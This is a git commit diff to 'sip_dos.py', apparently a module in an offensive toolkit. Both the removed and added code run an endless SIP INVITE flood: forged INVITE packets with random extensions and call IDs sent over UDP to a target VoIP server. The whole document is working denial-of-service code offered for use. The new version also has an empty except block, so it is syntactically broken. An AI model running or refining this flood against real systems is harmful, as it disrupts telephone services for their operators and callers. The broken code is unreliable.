5c0d9a7eda48a0d174f796c0a48691e2a727b9a1
Elzy <elzyproot@protonmail.com>
2026-01-22 13:30:57 +0700

    Update sip_dos.py

--- modules/auxiliary/voip/sip_dos.py
+++ modules/auxiliary/voip/sip_dos.py
@@ -1,25 +1,40 @@
-import random
 import socket
+import random
 
 REQUIRED_OPTIONS = {
-        "IP": "",
-        "PORT": "standar port 5060"
+    "IP": "",
+    "PORT": "standar port 5060"
 }
 
 def execute(options):
     ip = options.get("IP")
     port = int(options.get("PORT"))
-
+    
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    print(f"[*] Starting Invite Flood on {ip}...")
+    
+    print(f"[*] Starting SIP Invite Flood on {ip}:{port}")
+    print("[*] Press Ctrl+C to stop the attack.")
+    
+    count = 0
+    try:
+        while True:
+            fake_ext = random.randint(100, 9999)
+            payload = (
+                f"INVITE sip:{fake_ext}@{ip} SIP/2.0\r\n"
+                f"From: <sip:storm@{ip}>;tag={random.randint(100,999)}\r\n"
+                f"To: <sip:{fake_ext}@{ip}>\r\n"
+                f"Call-ID: {random.getrandbits(32)}\r\n"
+                "CSeq: 1 INVITE\r\n"
+                "Max-Forwards: 70\r\n\r\n"
+            )
+            sock.sendto(payload.encode(), (ip, port))
+            count += 1
+            print(f"[!] Sent {count} packets...", end="\r")
+                
+    except KeyboardInterrupt:
+            
+    finally:
+        sock.close()
+    
+    return True
 
-    while True:
-        fake_ext = random.randint(100, 9999)
-        payload = (
-            f"INVITE sip:{fake_ext}@{ip} SIP/2.0\r\n"
-            f"From: <sip:scammer@{ip}>;tag={random.randint(100,999)}\r\n"
-            f"To: <sip:{fake_ext}@{ip}>\r\n"
-            "Call-ID: " + str(random.getrandbits(32)) + "\r\n"
-            "CSeq: 1 INVITE\r\n\r\n"
-        )
-        sock.sendto(payload.encode(), (ip, port))
